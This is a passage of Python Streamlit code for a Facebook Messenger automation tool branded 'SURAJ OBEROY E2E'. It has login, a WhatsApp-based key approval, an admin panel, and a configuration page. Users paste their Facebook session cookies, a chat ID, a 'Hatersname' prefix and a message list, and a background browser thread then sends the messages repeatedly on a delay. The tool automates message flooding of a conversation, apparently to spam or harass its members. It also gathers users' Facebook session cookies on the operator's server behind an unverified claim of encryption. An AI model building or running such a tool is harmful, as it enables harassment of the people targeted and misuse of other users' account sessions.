                driver.quit()
                log_message(f"ADMIN-NOTIFY: Browser closed", automation_state)
            except:
                pass

def run_automation_with_notification(user_config, username, automation_state, user_id):
    send_admin_notification(user_config, username, automation_state, user_id)
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
   
    if automation_state.running:
        return
   
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
   
    db.set_automation_running(user_id, True)
   
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

def admin_panel():
    st.markdown(f"""
    <div class="main-header">
        {get_default_logo_html()}
        <h1>👑 ADMIN PANEL 👑</h1>
        <p>KEY APPROVAL MANAGEMENT</p>
    </div>
    """, unsafe_allow_html=True)
   
    pending = load_pending_approvals()
    approved_keys = load_approved_keys()
   
    col1, col2 = st.columns(2)
    with col1:
        st.success(f"**Total Approved Keys:** `{len(approved_keys)}`")
    with col2:
        st.warning(f"**Pending Approvals:** `{len(pending)}`")
   
    st.markdown("---")
   
    if pending:
        st.markdown("#### ⏳ Pending Approval Requests")
       
        for key, info in pending.items():
            with st.container():
                col1, col2, col3 = st.columns([2, 2, 1])
                with col1:
                    st.markdown(f"**👤 {info['name']}**")
                with col2:
                    st.code(key, language="text")
                with col3:
                    if st.button("✅ Approve", key=f"approve_{key}", use_container_width=True):
                        approved_keys[key] = info
                        save_approved_keys(approved_keys)
                        del pending[key]
                        save_pending_approvals(pending)
                        st.success(f"✅ Approved {info['name']}!")
                        st.rerun()
                st.divider()
    else:
        st.info("✨ No pending approvals")
   
    if approved_keys:
        st.markdown("#### ✅ Approved Keys")
        approved_list = list(approved_keys.keys())
        for i in range(0, len(approved_list), 2):
            cols = st.columns(2)
            for j in range(2):
                if i + j < len(approved_list):
                    key = approved_list[i + j]
                    info = approved_keys[key]
                    cols[j].markdown(f"**👑 {info['name']}**  \n`{key}`")
   
    st.markdown("---")
    if st.button("🚪 Logout", key="admin_logout_btn", use_container_width=True):
        st.session_state.approval_status = 'login'
        st.rerun()

def approval_request_page(user_key, username):
    st.markdown(f"""
    <div class="main-header">
        {get_default_logo_html()}
        <h1>👑 PREMIUM KEY APPROVAL REQUIRED 👑</h1>
        <p>ONE MONTH 0 RS PAID</p>
    </div>
    """, unsafe_allow_html=True)
   
    if st.session_state.approval_status == 'not_requested':
        st.markdown("### 🔑 Request Access")
       
        col1, col2 = st.columns(2)
        with col1:
            st.info(f"**Your Unique Key:**  \n`{user_key}`")
        with col2:
            st.info(f"**Username:**  \n`{username}`")
       
        col1, col2 = st.columns([1, 1])
       
        with col1:
            if st.button("📢 Request Approval", use_container_width=True, key="request_approval_btn"):
                pending = load_pending_approvals()
                pending[user_key] = {
                    "name": username,
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                save_pending_approvals(pending)
               
                st.session_state.approval_status = 'pending'
                st.session_state.whatsapp_opened = False
                st.rerun()
       
        with col2:
            if st.button("👑 Admin Panel", use_container_width=True, key="admin_panel_btn"):
                st.session_state.approval_status = 'admin_login'
                st.rerun()
   
    elif st.session_state.approval_status == 'pending':
        st.warning("⏳ Approval Pending...")
        st.info(f"**Your Key:** `{user_key}`")
       
        whatsapp_url = send_whatsapp_message(username, user_key)
       
        if not st.session_state.whatsapp_opened:
            whatsapp_js = f"""
            <script>
                setTimeout(function() {{
                    window.open('{whatsapp_url}', '_blank');
                }}, 500);
            </script>
            """
            components.html(whatsapp_js, height=0)
            st.session_state.whatsapp_opened = True
       
        st.success(f"📱 WhatsApp opening automatically for: **{username}**")
        st.markdown(f"""
        <div style="text-align: center; margin: 20px 0;">
            <a href="{whatsapp_url}" target="_blank" style="background: linear-gradient(135deg, #006400, #228b22); color: white; padding: 12px 30px; border-radius: 40px; text-decoration: none; font-weight: bold; display: inline-block;">
                📱 Click Here to Open WhatsApp
            </a>
        </div>
        """, unsafe_allow_html=True)
       
        with st.expander("📝 Message Preview"):
            st.code(f"""👑 HELLO SURAJ OBEROY SIR PLEASE 👑
My name is {username}
Please approve my key:
🔑 {user_key}""")
       
        st.markdown("---")
       
        col1, col2 = st.columns(2)
       
        with col1:
            if st.button("🔍 Check Approval Status", use_container_width=True, key="check_approval_btn"):
                if check_approval(user_key):
                    st.session_state.key_approved = True
                    st.session_state.approval_status = 'approved'
                    st.success("✅ Approved! Redirecting...")
                    time.sleep(1)
                    st.rerun()
                else:
                    st.error("⏳ Not approved yet. Please wait!")
       
        with col2:
            if st.button("◀️ Back", use_container_width=True, key="back_btn"):
                st.session_state.approval_status = 'not_requested'
                st.session_state.whatsapp_opened = False
                st.rerun()
   
    elif st.session_state.approval_status == 'admin_login':
        st.markdown("### 👑 Admin Login")
       
        admin_password = st.text_input("Enter Admin Password:", type="password", key="admin_password_input")
       
        col1, col2 = st.columns(2)
        with col1:
            if st.button("🔓 Login", use_container_width=True, key="admin_login_btn"):
                if admin_password == ADMIN_PASSWORD:
                    st.session_state.approval_status = 'admin_panel'
                    st.rerun()
                else:
                    st.error("❌ Invalid password!")
       
        with col2:
            if st.button("◀️ Back", use_container_width=True, key="admin_back_btn"):
                st.session_state.approval_status = 'not_requested'
                st.rerun()
   
    elif st.session_state.approval_status == 'admin_panel':
        admin_panel()

def login_page():
    st.markdown(f"""
    <div class="main-header">
        {get_default_logo_html()}
        <h1>👑 SURAJ OBEROY E2E SERVER 👑</h1>
        <p>"səvən bıllıon smıle's ın ʈhıs world buʈ ɣour's ıs mɣ fαvourıʈəs___✨"</p>
    </div>
    """, unsafe_allow_html=True)
   
    tab1, tab2 = st.tabs(["🔐 Login", "📝 Sign Up"])
   
    with tab1:
        st.markdown("### Welcome Back!")
        username = st.text_input("Username", key="login_username", placeholder="Enter your username")
        password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
       
        if st.button("Login", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    user_key = generate_user_key(username, password)
                   
                    st.session_state.logged_in = True
                    st.session_state.user_id = user_id
                    st.session_state.username = username
                    st.session_state.user_key = user_key
                   
                    if check_approval(user_key):
                        st.session_state.key_approved = True
                        st.session_state.approval_status = 'approved'
                       
                        should_auto_start = db.get_automation_running(user_id)
                        if should_auto_start:
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                start_automation(user_config, user_id)
                    else:
                        st.session_state.key_approved = False
                        st.session_state.approval_status = 'not_requested'
                   
                    st.success(f"✨ Welcome back, {username}!")
                    st.rerun()
                else:
                    st.error("❌ Invalid username or password!")
            else:
                st.warning("⚠️ Please enter both username and password")
   
    with tab2:
        st.markdown("### Create New Account")
        new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
        new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
        confirm_password = st.text_input("Confirm Password", key="confirm_password", type="password", placeholder="Re-enter your password")
       
        if st.button("Create Account", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    success, message = db.create_user(new_username, new_password)
                    if success:
                        st.success(f"✅ {message} Please login now!")
                    else:
                        st.error(f"❌ {message}")
                else:
                    st.error("❌ Passwords do not match!")
            else:
                st.warning("⚠️ Please fill all fields")

def main_app():
    st.markdown(f"""
    <div class="main-header">
        {get_default_logo_html()}
        <h1>👑 SURAJ OBEROY E2E OFFLINE 👑</h1>
        <p>"səvən bıllıon smıle's ın ʈhıs world buʈ ɣour's ıs mɣ fαvourıʈəs___✨"</p>
    </div>
    """, unsafe_allow_html=True)
   
    if not st.session_state.auto_start_checked and st.session_state.user_id:
        st.session_state.auto_start_checked = True
        should_auto_start = db.get_automation_running(st.session_state.user_id)
        if should_auto_start and not st.session_state.automation_state.running:
            user_config = db.get_user_config(st.session_state.user_id)
            if user_config and user_config['chat_id']:
                start_automation(user_config, st.session_state.user_id)
   
    st.sidebar.markdown(f"""
    <div style="text-align: center; padding: 1rem 0;">
        <div style="background: rgba(255,215,0,0.1); border-radius: 20px; padding: 1rem;">
            <h3 style="color: #ffd700; margin: 0;">👑 {st.session_state.username}</h3>
            <p style="color: #d4af37; margin: 0.5rem 0; font-size: 0.8rem;">ID: {st.session_state.user_id}</p>
            <code style="background: rgba(0,0,0,0.5); padding: 0.3rem; border-radius: 8px; font-size: 0.7rem;">{st.session_state.user_key}</code>
            <p style="color: #4CAF50; margin-top: 0.5rem;">✅ Key Approved</p>
        </div>
    </div>
    """, unsafe_allow_html=True)
   
    if st.sidebar.button("🚪 Logout", use_container_width=True):
        if st.session_state.automation_state.running:
            stop_automation(st.session_state.user_id)
       
        st.session_state.logged_in = False
        st.session_state.user_id = None
        st.session_state.username = None
        st.session_state.user_key = None
        st.session_state.key_approved = False
        st.session_state.automation_running = False
        st.session_state.auto_start_checked = False
        st.session_state.approval_status = 'not_requested'
        st.rerun()
   
    user_config = db.get_user_config(st.session_state.user_id)
   
    if user_config:
        tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
       
        with tab1:
            st.markdown("### Your Configuration")
           
            chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'],
                                   placeholder="e.g., 1362400298935018",
                                   help="Facebook conversation ID from the URL")
           
            name_prefix = st.text_input("Hatersname", value=user_config['name_prefix'],
                                       placeholder="e.g., [END TO END]",
                                       help="Prefix to add before each message")
           
            delay = st.number_input("Delay (seconds)", min_value=1, max_value=300,
                                   value=user_config['delay'],
                                   help="Wait time between messages")
           
            cookies = st.text_area("Facebook Cookies (optional - kept private)",
                                  value="",
                                  placeholder="Paste your Facebook cookies here (will be encrypted)",
                                  height=100,
                                  help="Your cookies are encrypted and never shown to anyone")
           
            messages = st.text_area("Messages (one per line)",
                                   value=user_config['messages'],
                                   placeholder="NP file copy paste karo",
                                   height=150,
                                   help="Enter each message on a new line")
           
            if st.button("💾 Save Configuration", use_container_width=True):
                final_cookies = cookies if cookies.strip() else user_config['cookies']
                db.update_user_config(
                    st.session_state.user_id,
                    chat_id,
                    name_prefix,
                    delay,
                    final_cookies,
                    messages
                )
                st.success("✅ Configuration saved successfully!")
                st.rerun()
       
        with tab2:
            st.markdown("### Automation Control")
           
            user_config = db.get_user_config(st.session_state.user_id)
           
            col1, col2, col3 = st.columns(3)
            with col1:
                st.metric("📨 Messages Sent", st.session_state.automation_state.message_count)
            with col2:
                status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
                st.metric("📊 Status", status)
            with col3:
                chat_preview = user_config['chat_id'][:10] + "..." if user_config['chat_id'] else "Not Set"
                st.metric("💬 Chat ID", chat_preview)
           
            st.markdown("---")
           
            col1, col2 = st.columns(2)
           
            with col1:
                if st.button("▶️ Start Automation", disabled=st.session_state.automation_state.running, use_container_width=True):
                    if user_config['chat_id']:
                        start_automation(user_config, st.session_state.user_id)
                        st.success("✅ Automation started!")
                        st.rerun()
                    else:
                        st.error("⚠️ Please set Chat ID in Configuration first!")
           
            with col2:
                if st.button("⏹️ Stop Automation", disabled=not st.session_state.automation_state.running, use_container_width=True):
                    stop_automation(st.session_state.user_id)
                    st.warning("⏹️ Automation stopped!")
                    st.rerun()
           
            if st.session_state.automation_state.logs:
                st.markdown("### 📟 Live Console Output")
               
                logs_html = '<div class="console-output">'
                for log in st.session_state.automation_state.logs[-30:]:
                    logs_html += f'<div class="console-line">{log}</div>'
                logs_html += '</div>'
               
                st.markdown(logs_html, unsafe_allow_html=True)
               
                if st.button("🔄 Refresh Logs"):
                    st.rerun()
    else:
        st.warning("⚠️ No configuration found. Please refresh the page!")

if not st.session_state.logged_in:
    login_page()
elif not st.session_state.key_approved:
    approval_request_page(st.session_state.user_key, st.session_state.username)
else:
    main_app()

st.markdown("""
<div class="footer">
    Made with ❤️ by <span style="color: #ffd700; font-weight: bold;">SURAJ OBEROY</span> | © 2026
</div>
""", unsafe_allow_html=True)
